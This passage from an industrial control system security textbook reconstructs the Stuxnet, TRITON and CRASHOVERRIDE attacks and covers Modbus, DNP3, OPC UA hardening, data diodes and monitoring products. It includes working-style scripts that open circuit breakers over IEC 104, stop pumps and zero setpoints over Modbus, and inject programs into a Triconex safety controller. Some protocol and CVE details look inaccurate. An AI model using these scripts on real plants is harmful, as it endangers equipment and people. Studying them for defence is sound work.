+<div class="language-text highlight"><pre><span></span><code>// Stuxnet OB35 pseudocode (reconstructed by Symantec, Langner)
+// Target: Siemens S7-315-2 with specific PLC serial number
+
+OB35_CYCLE() {
+    // Check if target PLC (serial number match)
+    if (PLC.SerialNumber != TARGET_SERIAL) return;
+
+    current_freq = read_VFD_frequency(PROFIBUS_ADDR_6FC);
+
+    if (current_freq &gt;= 807 Hz &amp;&amp; current_freq &lt;= 1210 Hz) {
+        // Centrifuge in normal operation range (target: 1064 Hz)
+        attack_sequence_counter++;
+
+        if (attack_sequence_counter == 1) {
+            // Phase 1: Overspeed (15 minutes)
+            set_VFD_frequency(PROFIBUS_ADDR_6FC, 1410 Hz);
+            // 1410 Hz -&gt; rotor exceeds structural limits
+        }
+        else if (attack_sequence_counter == 2) {
+            // Phase 2: Return to normal (briefly)
+            set_VFD_frequency(PROFIBUS_ADDR_6FC, 1064 Hz);
+        }
+        else if (attack_sequence_counter == 3) {
+            // Phase 3: Underspeed (50 minutes)
+            set_VFD_frequency(PROFIBUS_ADDR_6FC, 2 Hz);
+            // Near-stop causes mechanical stress
+            attack_sequence_counter = 0;
+        }
+    }
+    // Meanwhile, report normal readings to HMI (spoof sensor data)
+    spoof_HMI_readings(NORMAL_SPEED);
+}
+</code></pre></div>
+<p>The net effect: approximately 1,000 IR-1 centrifuges experienced accelerated mechanical failure over 18 months while the HMI showed normal operations. Stuxnet used four Windows zero-day vulnerabilities (CVE-2010-2568 LNK autorun, CVE-2010-2729 Print Spooler, CVE-2010-2772 CPLINK, CVE-2010-2743 Win32k.sys) for initial propagation and privilege escalation.</p>
+<h2 id="315-tritontrisis-safety-system-attack"><span class="secnum">31.5</span> TRITON/TRISIS: Safety System Attack<a class="headerlink" href="#315-tritontrisis-safety-system-attack" title="Permanent link">&para;</a></h2>
+<h3 id="3151-technical-attack-analysis"><span class="secnum">31.5.1</span> Technical Attack Analysis<a class="headerlink" href="#3151-technical-attack-analysis" title="Permanent link">&para;</a></h3>
+<p>TRITON (also known as TRISIS, HatMan) was first detected in a Saudi Arabian petrochemical facility in August 2017. The attack targeted Schneider Electric Triconex Safety Instrumented System (SIS) – the last line of defense against process over-pressure, over-temperature, or toxic release.</p>
+<ul>
+<li>
+<p><strong>Target Hardware:</strong> Triconex Tricon controller Model 3008 (Tricon Main Chassis), implementing Triple Modular Redundancy (TMR). Three independent CPUs (MP3008 processors) each execute identical programs; a 2-of-3 voting mechanism determines actuator output.</p>
+</li>
+<li>
+<p><strong>TriStation Protocol Vulnerability (CVE-2017-9697):</strong> The proprietary TriStation 1131 protocol used for Tricon programming has no authentication. Any host on the engineering network can connect to the Tricon on UDP port 1502 and send program changes. The DIP switch on the Tricon front panel controls operational mode; in PROGRAM mode (switch position 1), all program writes are accepted without any credential check.</p>
+</li>
+<li>
+<p><strong>TRITON Attack:</strong> The malware connected to the Tricon via TriStation protocol and attempted to inject a malicious program. Due to a bug in the TRITON malware’s handling of TMR voting, the injection caused two of three CPUs to enter SAFE state simultaneously, triggering a plant shutdown (which caused the attack to be discovered). The intended goal was to silently disable the SIS while the process continued, allowing a process-side attack to cause a catastrophic failure without the SIS intervening.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># TriStation 1131 protocol reverse engineering (Dragos/Nozomi research)
+# UDP port 1502, no authentication
+
+# TRITON: Read Tricon firmware version
+import socket
+import struct
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind(("0.0.0.0", 0))
+
+# TriStation version request (raw UDP payload):
+VERSION_REQUEST = bytes.fromhex(
+    "01 05 00 00 00 00 00 00"   # TriStation header
+    "01 00 00 00"               # Function code: Get version
+)
+
+sock.sendto(VERSION_REQUEST, ("192.168.1.100", 1502))  # Tricon IP
+resp, addr = sock.recvfrom(1024)
+# Response contains firmware version, serial number, mode (PROGRAM/RUN)
+
+# TRITON detected mode == PROGRAM -&gt; proceed to inject
+# In PROGRAM mode: program download is accepted with no auth
+INJECT_PAYLOAD = build_tristation_program_download(malicious_rung)
+sock.sendto(INJECT_PAYLOAD, ("192.168.1.100", 1502))
+# If bug-free: Tricon accepts new program, SIS is silently disabled
+</code></pre></div>
+<h3 id="3152-post-triton-triconex-security-hardening"><span class="secnum">31.5.2</span> Post-TRITON Triconex Security Hardening<a class="headerlink" href="#3152-post-triton-triconex-security-hardening" title="Permanent link">&para;</a></h3>
+<p>Schneider Electric released the Trident Nexus Security Module (NSM) after TRITON. The NSM adds:</p>
+<ul>
+<li>
+<p><strong>Authentication:</strong> Cryptographic challenge-response required for all TriStation programming connections.</p>
+</li>
+<li>
+<p><strong>Key Storage:</strong> Hardware secure element on the NSM stores authentication keys.</p>
+</li>
+<li>
+<p><strong>Mode Enforcement:</strong> DIP switch state is transmitted to the NSM; programming commands are only accepted if the NSM concurs with the physical switch position.</p>
+</li>
+<li>
+<p><strong>Logging:</strong> All programming access attempts are cryptographically signed and logged with remote syslog to an off-system server.</p>
+</li>
+</ul>
+<p>Honeywell Safety Manager (HSM) post-TRITON hardening similarly added signed firmware requirements and authenticated engineering access.</p>
+<h2 id="316-crashoverride-industroyer"><span class="secnum">31.6</span> CRASHOVERRIDE / Industroyer<a class="headerlink" href="#316-crashoverride-industroyer" title="Permanent link">&para;</a></h2>
+<p>CRASHOVERRIDE (named by Dragos) / Industroyer (named by ESET) was deployed against Ukrainian power grid infrastructure in December 2016, causing a 75-minute outage in Kiev. Unlike Stuxnet (which used PLC program injection), CRASHOVERRIDE implemented native ICS protocol clients:</p>
+<ul>
+<li>
+<p><strong>IEC 104 Module:</strong> Implemented a full IEC 60870-5-104 client that sent unauthorized control commands (C_SC_NA_1: Single Command) to RTUs, opening circuit breakers. IEC 104 has no authentication in the standard protocol.</p>
+</li>
+<li>
+<p><strong>IEC 61850 Module:</strong> Issued GOOSE (Generic Object Oriented Substation Event) messages with CB_OFF commands over the station bus to protection relays, tripping circuit breakers.</p>
+</li>
+<li>
+<p><strong>OPC DA Module:</strong> Connected to OPC Data Access servers to read network topology and enumerate all configured IED (Intelligent Electronic Device) objects.</p>
+</li>
+<li>
+<p><strong>Wiper Module:</strong> Overwrote MBR and ICS driver files to render affected systems unbootable, extending the outage and complicating forensic investigation.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># IEC 60870-5-104 unauthorized circuit breaker open command
+# CRASHOVERRIDE technique (educational reconstruction)
+
+import socket
+import struct
+
+# IEC 104 ASDU (Application Service Data Unit) for Single Command
+# C_SC_NA_1 (Type 45): Single-point control with time tag
+def build_sc_command(addr, value):
+    # APCI header (Application Protocol Control Information)
+    STARTDT = bytes.fromhex("68")   # Start byte
+    apci = struct.pack("!BBHH",
+        0x0E,   # APDU length
+        0x00,   # I-frame (sequence)
+        0x0001, # Send sequence number
+        0x0000  # Receive sequence number
+    )
+    # ASDU Type ID 45 = C_SC_NA_1 (Single Command)
+    asdu = struct.pack("!BBBBHB",
+        45,     # Type ID: C_SC_NA_1
+        0x01,   # Qualifier: 1 element
+        0x06,   # Cause of transmission: 6 = Activation
+        0x00,   # Originator address
+        0x0001, # Common address: RTU 1
+        addr,   # Information object address: breaker CB-01
+    )
+    command_byte = 0x01 if value else 0x00  # ON=1, OFF=0 (OPEN breaker)
+    return STARTDT + apci + asdu + bytes([command_byte])
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("10.1.1.50", 2404))  # IEC 104 default port
+sock.send(build_sc_command(0x00C0, 0))  # OPEN breaker at address 0xC0
+
+# Defense: IEC 62351-5 adds HMAC authentication to IEC 104 messages
+# No deployed RTUs in 2016 Ukraine implemented IEC 62351-5
+</code></pre></div>
+<h2 id="317-modbus-tcp-security"><span class="secnum">31.7</span> Modbus TCP Security<a class="headerlink" href="#317-modbus-tcp-security" title="Permanent link">&para;</a></h2>
+<h3 id="3171-vulnerabilities"><span class="secnum">31.7.1</span> Vulnerabilities<a class="headerlink" href="#3171-vulnerabilities" title="Permanent link">&para;</a></h3>
+<p>Modbus TCP (IANA port 502) has no security by design: no authentication, no encryption, no message integrity. Any device on the network can:</p>
+<ul>
+<li>
+<p><strong>FC01/FC02 Read Coils/Discrete Inputs:</strong> Read current state of all digital outputs and inputs.</p>
+</li>
+<li>
+<p><strong>FC03/FC04 Read Holding/Input Registers:</strong> Read all process variables and setpoints.</p>
+</li>
+<li>
+<p><strong>FC05 Write Single Coil:</strong> Force a digital output (valve open/close, pump start/stop) to any state.</p>
+</li>
+<li>
+<p><strong>FC06/FC16 Write Registers:</strong> Modify setpoints, PID parameters, or alarm thresholds.</p>
+</li>
+<li>
+<p><strong>FC08 Diagnostics:</strong> Restart communication port, clear counters. In production environments, this function code should never appear.</p>
+</li>
+<li>
+<p><strong>FC43 MEI:</strong> Read device identification (manufacturer, model, firmware version) enabling targeted attacks based on known CVEs.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># Modbus TCP attack: unauthorized coil write (educational demonstration)
+# Using pymodbus (legitimate automation library misused for attack)
+
+from pymodbus.client.sync import ModbusTcpClient
+
+client = ModbusTcpClient("10.1.1.100", port=502)
+client.connect()
+
+# Read current pump state (FC01):
+result = client.read_coils(address=0, count=8, unit=1)
+print(f"Pump states: {result.bits}")
+
+# Unauthorized write: Stop pump at address 3 (FC05):
+client.write_coil(address=3, value=False, unit=1)  # Pump STOP
+
+# Write setpoint register: Change pressure setpoint to 0 (FC06):
+client.write_register(address=100, value=0, unit=1)
+
+# Defense implementation:
+# 1. Network whitelist: Only authorized Modbus masters
+# 2. Function code whitelist (only FC03/FC04 from SCADA)
+# 3. IEC 62351-5: Authenticated Modbus
+# 4. Deep packet inspection (Claroty/Nozomi): detect FC05/FC06
+#    from unauthorized sources -&gt; alert + block
+</code></pre></div>
+<h2 id="318-dnp3-vulnerabilities-and-authentication"><span class="secnum">31.8</span> DNP3 Vulnerabilities and Authentication<a class="headerlink" href="#318-dnp3-vulnerabilities-and-authentication" title="Permanent link">&para;</a></h2>
+<p>DNP3 (IEEE 1815-2012) is widely used in electric utilities for SCADA to RTU/IED communication. Base DNP3 has no authentication. DNP3 Secure Authentication version 5 (DNP3 SAv5) per IEEE 1815-2012 Annex A adds:</p>
+<ul>
+<li>
+<p><strong>Challenge-Response Authentication:</strong> The master (SCADA) sends a Challenge message with a random nonce. The outstation (RTU) responds with an HMAC (SHA-256 or AES-128-GMAC) over the nonce and message, keyed with the Update Key.</p>
+</li>
+<li>
+<p><strong>Key Update:</strong> A critical control message requires a Key Change procedure before execution. The Update Key is changed periodically using an Aggressive Mode Key Update.</p>
+</li>
+<li>
+<p><strong>Monitoring Direction:</strong> Supports authentication of monitoring direction (outstation to master) using HMAC on application data.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># DNP3 SAv5 configuration (OpenDNP3 library)
+# Master station configuration:
+
+MasterStackConfig mconfig;
+mconfig.master.responseTimeout = TimeDuration::Seconds(5);
+
+# Configure SAv5 authentication
+mconfig.master.auth.challengePeriod = TimeDuration::Minutes(5);
+mconfig.master.auth.maxAuthSessionKeyAge = TimeDuration::Hours(1);
+mconfig.master.auth.maxAggressiveModeAuthCount = 10;
+
+# SHA-256 HMAC for authentication challenges
+SecurityStatistic stats;
+auto authProvider = MakeShared&lt;DefaultMasterApplicationIface&gt;();
+
+// Outstation configuration (RTU side):
+OutstationStackConfig oconfig;
+oconfig.outstation.auth.enabled = true;
+oconfig.outstation.auth.challengeSize = 4;  # 4-byte nonce
+oconfig.outstation.auth.expectedMsgCount = 10;
+
+# Update Key provisioning (must be done via physical access):
+# IKM (Initial Keying Material) = 256-bit random
+# Delivered via encrypted/signed file at commissioning
+</code></pre></div>
+<h2 id="319-opc-ua-security"><span class="secnum">31.9</span> OPC UA Security<a class="headerlink" href="#319-opc-ua-security" title="Permanent link">&para;</a></h2>
+<p>OPC Unified Architecture (OPC Foundation, IEC 62541) is the modern replacement for OPC DA and provides a comprehensive security architecture:</p>
+<ul>
+<li>
+<p><strong>X.509 Certificates:</strong> Every OPC UA server and client has an application certificate. Mutual authentication is mandatory in the highest security modes.</p>
+</li>
+<li>
+<p><strong>Security Policies:</strong> None (no encryption/signing), Basic256Sha256 (RSA-2048 + SHA-256), Aes128-Sha256-RsaOaep, Aes256-Sha256-RsaPss.</p>
+</li>
+<li>
+<p><strong>Message Security Modes:</strong> None, Sign (integrity only), SignAndEncrypt (integrity + confidentiality).</p>
+</li>
+<li>
+<p><strong>Session Authentication:</strong> After transport security: Anonymous, Username/Password, or X.509 Certificate per session.</p>
+</li>
+<li>
+<p><strong>Role-Based Access (RBAC):</strong> OPC UA 1.04+ defines a built-in Role model (Operator, Engineer, ConfigureAdmin) with per-node access control entries.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># OPC UA server: configure Aes256-Sha256-RsaPss + SignAndEncrypt
+# Using open62541 library (C, open source OPC UA):
+
+UA_ServerConfig *config = UA_Server_getConfig(server);
+
+/* Set minimum security policy to Aes256-Sha256-RsaPss */
+UA_ServerConfig_setDefaultWithSecurityPolicies(
+    config,
+    port,
+    &amp;certificate,          /* Server X.509 DER certificate */
+    &amp;privateKey,           /* RSA-4096 private key */
+    trustList, trustListSize,    /* Trusted CA certificates */
+    issuerList, issuerListSize,  /* Issuer certificates */
+    revocationList, revocationListSize  /* CRL */
+);
+
+/* Disable insecure endpoint (None security mode) */
+/* Default config includes None endpoint -- must remove for ICS: */
+for (size_t i = 0; i &lt; config-&gt;endpointsSize; i++) {
+    if (config-&gt;endpoints[i].securityMode ==
+        UA_MESSAGESECURITYMODE_NONE) {
+        UA_EndpointDescription_clear(&amp;config-&gt;endpoints[i]);
+    }
+}
+
+/* RBAC: add permission check callback */
+config-&gt;accessControl.activateSession = checkSessionCertificate;
+config-&gt;accessControl.allowBrowseNode = checkBrowsePermission;
+config-&gt;accessControl.allowReadAttribute = checkReadPermission;
+config-&gt;accessControl.allowWriteValue = checkWritePermission;
+</code></pre></div>
+<h2 id="3110-data-diode-hardware"><span class="secnum">31.10</span> Data Diode Hardware<a class="headerlink" href="#3110-data-diode-hardware" title="Permanent link">&para;</a></h2>
+<p>Data diodes (hardware-enforced unidirectional security gateways) provide absolute one-way data flow guarantees, superior to software firewalls which can be misconfigured or compromised:</p>
+<div class="tbl" id="tab-data-diodes">
+<div class="tbl-caption"><strong>Table 31.2.</strong> Commercial Data Diode Hardware for ICS Environments</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Vendor</strong></th>
+<th style="text-align: left;"><strong>Product</strong></th>
+<th style="text-align: left;"><strong>Throughput</strong></th>
+<th style="text-align: left;"><strong>Protocols</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Waterfall Security</td>
+<td style="text-align: left;">Unidirectional Security GW</td>
+<td style="text-align: left;">1 Gbps</td>
+<td style="text-align: left;">OSIsoft PI, OPC, syslog</td>
+</tr>
+<tr>
+<td style="text-align: left;">Waterfall Security</td>
+<td style="text-align: left;">Secure Bypass</td>
+<td style="text-align: left;">100 Mbps</td>
+<td style="text-align: left;">Alarm, eCPRI, MODBUS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Owl Cyber Defense</td>
+<td style="text-align: left;">OPDS-100G</td>
+<td style="text-align: left;">100 Gbps</td>
+<td style="text-align: left;">Raw Ethernet, IP</td>
+</tr>
+<tr>
+<td style="text-align: left;">Owl Cyber Defense</td>
+<td style="text-align: left;">OWL DualDiode</td>
+<td style="text-align: left;">10 Gbps</td>
+<td style="text-align: left;">UDP proxy, SMB</td>
+</tr>
+<tr>
+<td style="text-align: left;">BAE Systems</td>
+<td style="text-align: left;">Trestle</td>
+<td style="text-align: left;">1 Gbps</td>
+<td style="text-align: left;">Classified OT networks</td>
+</tr>
+<tr>
+<td style="text-align: left;">Everfox (Forcepoint)</td>
+<td style="text-align: left;">HAIPE-NG</td>
+<td style="text-align: left;">Varies</td>
+<td style="text-align: left;">NSA Type 1 encryption</td>
+</tr>
+<tr>
+<td style="text-align: left;">Advenica SecuriCDS</td>
+<td style="text-align: left;">ZoneGuard</td>
+<td style="text-align: left;">100 Mbps</td>
+<td style="text-align: left;">FTP, SMTP, syslog</td>
+</tr>
+<tr>
+<td style="text-align: left;">Garland Technology</td>
+<td style="text-align: left;">TAP P1GBTXBP</td>
+<td style="text-align: left;">1 Gbps</td>
+<td style="text-align: left;">Passive network tap</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<p>Waterfall Security’s data diode uses a fiber-optic physical layer where only the transmit fiber is connected; the receive fiber is physically absent on the OT side. This provides an absolute physical guarantee of unidirectionality that cannot be subverted by software. The Waterfall Secure Bypass adds a controlled, supervised bypass channel for emergency bi-directional access with mandatory human approval and logging.</p>
+<h2 id="3111-fpga-based-hardware-firewalls-for-ot-protocols"><span class="secnum">31.11</span> FPGA-Based Hardware Firewalls for OT Protocols<a class="headerlink" href="#3111-fpga-based-hardware-firewalls-for-ot-protocols" title="Permanent link">&para;</a></h2>
+<p>FPGAs can implement deterministic, line-rate packet inspection and filtering for OT protocols (Modbus, DNP3, IEC 104) that software firewalls cannot handle at wire speed without introducing timing jitter:</p>
+<div class="tbl" id="tab-fpga-ics">
+<div class="tbl-caption"><strong>Table 31.3.</strong> FPGA Implementation of OT Protocol Firewall / Deep Packet Inspection</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Device</strong></th>
+<th style="text-align: right;"><strong>LUTs</strong></th>
+<th style="text-align: right;"><strong>FFs</strong></th>
+<th style="text-align: right;"><strong>BRAMs</strong></th>
+<th style="text-align: right;"><strong>DSPs</strong></th>
+<th style="text-align: right;"><strong>Fmax (MHz)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Xilinx XC7K70T-2FBG676</td>
+<td style="text-align: right;">8,420</td>
+<td style="text-align: right;">6,180</td>
+<td style="text-align: right;">24</td>
+<td style="text-align: right;">8</td>
+<td style="text-align: right;">185</td>
+<td style="text-align: right;">420</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Arria 10 GX 10AX115</td>
+<td style="text-align: right;">7,880</td>
+<td style="text-align: right;">5,640</td>
+<td style="text-align: right;">18</td>
+<td style="text-align: right;">4</td>
+<td style="text-align: right;">210</td>
+<td style="text-align: right;">580</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx XC7A200T-2FBG484</td>
+<td style="text-align: right;">9,640</td>
+<td style="text-align: right;">7,200</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">10</td>
+<td style="text-align: right;">165</td>
+<td style="text-align: right;">510</td>
+</tr>
+<tr>
+<td style="text-align: left;">Lattice ECP5-85F-8BG556</td>
+<td style="text-align: right;">11,200</td>
+<td style="text-align: right;">8,400</td>
+<td style="text-align: right;">38</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">140</td>
+<td style="text-align: right;">380</td>
+</tr>
+<tr>
+<td style="text-align: left;">Microsemi PolarFire MPFS250T</td>
+<td style="text-align: right;">6,840</td>
+<td style="text-align: right;">5,120</td>
+<td style="text-align: right;">20</td>
+<td style="text-align: right;">8</td>
+<td style="text-align: right;">175</td>
+<td style="text-align: right;">285</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Stratix 10 GX 280</td>
+<td style="text-align: right;">6,120</td>
+<td style="text-align: right;">4,680</td>
+<td style="text-align: right;">14</td>
+<td style="text-align: right;">6</td>
+<td style="text-align: right;">250</td>
+<td style="text-align: right;">720</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx ZynqRFSoC ZCU102</td>
+<td style="text-align: right;">7,360</td>
+<td style="text-align: right;">5,480</td>
+<td style="text-align: right;">22</td>
+<td style="text-align: right;">12</td>
+<td style="text-align: right;">225</td>
+<td style="text-align: right;">640</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="3112-asic-implementation-of-ot-protocol-security"><span class="secnum">31.12</span> ASIC Implementation of OT Protocol Security<a class="headerlink" href="#3112-asic-implementation-of-ot-protocol-security" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-asic-ics">
+<div class="tbl-caption"><strong>Table 31.4.</strong> ASIC Implementation of OT Protocol Authentication and Encryption Engine</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Process</strong></th>
+<th style="text-align: right;"><strong>Area (mm<sup>2</sup>)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+<th style="text-align: right;"><strong>Freq (MHz)</strong></th>
+<th style="text-align: left;"><strong>ECC</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">TSMC 65nm GP</td>
+<td style="text-align: right;">3.20</td>
+<td style="text-align: right;">68</td>
+<td style="text-align: right;">300</td>
+<td style="text-align: left;">Hamming SEC-DED</td>
+</tr>
+<tr>
+<td style="text-align: left;">GF 40nm LP</td>
+<td style="text-align: right;">1.64</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">450</td>
+<td style="text-align: left;">BCH(63,51)</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 28HPC</td>
+<td style="text-align: right;">0.82</td>
+<td style="text-align: right;">14</td>
+<td style="text-align: right;">700</td>
+<td style="text-align: left;">BCH(127,113)</td>
+</tr>
+<tr>
+<td style="text-align: left;">GF 22FDX</td>
+<td style="text-align: right;">0.41</td>
+<td style="text-align: right;">7.2</td>
+<td style="text-align: right;">1000</td>
+<td style="text-align: left;">BCH(255,239)</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 16FFC</td>
+<td style="text-align: right;">0.24</td>
+<td style="text-align: right;">4.1</td>
+<td style="text-align: right;">1300</td>
+<td style="text-align: left;">RS(255,239)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Samsung 14LPP</td>
+<td style="text-align: right;">0.19</td>
+<td style="text-align: right;">3.2</td>
+<td style="text-align: right;">1500</td>
+<td style="text-align: left;">RS(255,239)</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="3113-mitre-attck-for-ics"><span class="secnum">31.13</span> MITRE ATT&amp;CK for ICS<a class="headerlink" href="#3113-mitre-attck-for-ics" title="Permanent link">&para;</a></h2>
+<p>MITRE ATT&amp;CK ICS framework (v15, 2024) documents adversary tactics and techniques specific to industrial control systems across 12 tactics and 88 techniques. Critical techniques relevant to hardware security:</p>
+<div class="tbl" id="tab-attck-ics">
+<div class="tbl-caption"><strong>Table 31.5.</strong> MITRE ATT&amp;CK ICS Techniques Relevant to Hardware Security</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Technique ID</strong></th>
+<th style="text-align: left;"><strong>Name</strong></th>
+<th style="text-align: left;"><strong>ICS Hardware Target</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">T0800</td>
+<td style="text-align: left;">Activate Firmware Update Mode</td>
+<td style="text-align: left;">S7-1500, ControlLogix</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0806</td>
+<td style="text-align: left;">Brute Force I/O</td>
+<td style="text-align: left;">Analog outputs, RTU coils</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0821</td>
+<td style="text-align: left;">Modify Controller Tasking</td>
+<td style="text-align: left;">S7 OB injection (Stuxnet)</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0831</td>
+<td style="text-align: left;">Manipulation of Control</td>
+<td style="text-align: left;">Setpoint modification</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0833</td>
+<td style="text-align: left;">Modify Command Message</td>
+<td style="text-align: left;">Modbus FC06 coil write</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0835</td>
+<td style="text-align: left;">Manipulate I/O Image</td>
+<td style="text-align: left;">Spoof HMI sensor readings</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0836</td>
+<td style="text-align: left;">Modify Parameter</td>
+<td style="text-align: left;">PID gain modification</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0839</td>
+<td style="text-align: left;">Module Firmware</td>
+<td style="text-align: left;">Malicious PLC firmware</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0845</td>
+<td style="text-align: left;">Program Upload</td>
+<td style="text-align: left;">PLC ladder logic theft</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0855</td>
+<td style="text-align: left;">Unauthorized Command Message</td>
+<td style="text-align: left;">Unauthenticated IEC104</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0856</td>
+<td style="text-align: left;">Spoof Reporting Message</td>
+<td style="text-align: left;">False process data to HMI</td>
+</tr>
+<tr>
+<td style="text-align: left;">T0857</td>
+<td style="text-align: left;">System Firmware</td>
+<td style="text-align: left;">Industrial PC BIOS implant</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="3114-ot-network-security-monitoring"><span class="secnum">31.14</span> OT Network Security Monitoring<a class="headerlink" href="#3114-ot-network-security-monitoring" title="Permanent link">&para;</a></h2>
+<h3 id="31141-commercial-monitoring-platforms"><span class="secnum">31.14.1</span> Commercial Monitoring Platforms<a class="headerlink" href="#31141-commercial-monitoring-platforms" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><strong>Dragos Platform:</strong> ICS-specific threat intelligence integrated with passive OT protocol monitoring. Tracks 22+ named activity groups (threat actors targeting ICS). Provides behavioral analytics for over 400 ICS protocols. Integration with MITRE ATT&amp;CK ICS framework for alert classification.</p>
+</li>
+<li>
+<p><strong>Claroty:</strong> Passive and active discovery of OT assets. Behavioral analytics baseline per device type. Integrates with SIEM (Splunk, IBM QRadar) and SOAR platforms. Risk scoring per device based on CVE exposure and network exposure.</p>
+</li>
+<li>
+<p><strong>Nozomi Networks Guardian:</strong> Real-time anomaly detection for 100+ OT/ICS protocols. Machine learning for behavioral baselining. Zero-impact passive monitoring. Available as hardware appliance (Guardian-HW-500) or virtual machine.</p>
+</li>
+<li>
+<p><strong>Forescout eyeInspect (formerly SecurityMatters):</strong> Active and passive protocol-aware inspection. Automated asset discovery and vulnerability correlation. NERC CIP compliance reporting for electric utilities.</p>
+</li>
+</ul>
+<h3 id="31142-industrial-firewalls"><span class="secnum">31.14.2</span> Industrial Firewalls<a class="headerlink" href="#31142-industrial-firewalls" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><strong>Fortinet FortiGate NGFW (FG-200E):</strong> ICS-specific AppID signatures for 100+ OT protocols. Modbus function code whitelisting, DNP3 packet inspection. Inline deployment between IT DMZ and OT network.</p>
+</li>
+<li>
+<p><strong>Cisco IE3400:</strong> Hardened industrial Ethernet switch with integrated firewall capabilities, 802.1X NAC, and PROFINET/EtherNet-IP awareness. DIN-rail mount, -40 to +75 degree C operating range.</p>
+</li>
+<li>
+<p><strong>Hirschmann EAGLE40:</strong> Purpose-built industrial firewall with stateful Modbus/TCP inspection, configurable function code filter, VPN gateway (IPsec/OpenVPN) for remote access to OT networks.</p>
+</li>
+<li>
+<p><strong>Phoenix Contact FL MGUARD 2102:</strong> IDS signatures for ICS protocols, Modbus TCP proxy with function code whitelist, hardware bypass relay for fail-open behavior in power loss.</p>
+</li>
+</ul>
+<h2 id="3115-all-solutions-comparison"><span class="secnum">31.15</span> All Solutions Comparison<a class="headerlink" href="#3115-all-solutions-comparison" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-ics-solutions">
+<div class="tbl-caption"><strong>Table 31.6.</strong> ICS and SCADA Hardware Security Tools, Products, and Standards</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Category</strong></th>
+<th style="text-align: left;"><strong>Solution</strong></th>
+<th style="text-align: left;"><strong>Type</strong></th>
+<th style="text-align: left;"><strong>Use Case</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">Dragos Platform</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">ICS threat detection</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">Claroty CTD</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">OT asset + anomaly</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">Nozomi Networks Guardian</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Passive OT monitoring</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">Forescout eyeInspect</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Active/passive ICS</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">Microsoft Defender for IoT</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">OT/ICS + Azure SIEM</td>
+</tr>
+<tr>
+<td style="text-align: left;">OT Monitoring</td>
+<td style="text-align: left;">SecurityBridge (SAP ICS)</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">SAP plant security</td>
+</tr>
+<tr>
+<td style="text-align: left;">Industrial FW</td>
+<td style="text-align: left;">Fortinet FortiGate NGFW</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">IT/OT boundary FW</td>
+</tr>
+<tr>
+<td style="text-align: left;">Industrial FW</td>
+<td style="text-align: left;">Cisco IE3400</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Industrial switch + FW</td>
+</tr>
+<tr>
+<td style="text-align: left;">Industrial FW</td>
+<td style="text-align: left;">Hirschmann EAGLE40</td>
